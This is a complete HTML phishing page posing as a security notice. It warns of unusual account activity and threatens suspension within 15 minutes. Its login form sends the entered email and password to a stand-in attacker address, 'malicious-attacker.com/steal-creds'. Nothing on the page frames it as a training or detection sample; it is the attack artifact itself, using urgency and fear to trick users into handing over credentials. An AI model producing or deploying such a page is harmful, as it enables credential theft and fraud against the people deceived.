
<!DOCTYPE html>
<html>
<head>
  <title>Important Security Notice</title>
  <style>
    body {
      background-color: black;
      color: red;
      font-family: 'Courier New', monospace;
      text-align: center;
      padding-top: 50px;
    }
    h1 {
      font-size: 3em;
      text-shadow: 2px 2px 5px red;
    }
    p {
      font-size: 1.5em;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      font-size: 1em;
    }
    .warning {
      color: yellow;
      font-size: 1.2em;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>⚠️ Your Account is at Risk ⚠️</h1>
  <p>We've detected unusual activity. Please verify your login credentials immediately.</p>
  <form action="http://malicious-attacker.com/steal-creds" method="POST">
    <input type="text" name="username" placeholder="Enter your email"><br>
    <input type="password" name="password" placeholder="Enter your password"><br>
    <button type="submit">Verify Now</button>
  </form>
  <div class="warning">Failure to act within 15 minutes will result in permanent account suspension.</div>
</body>
</html>
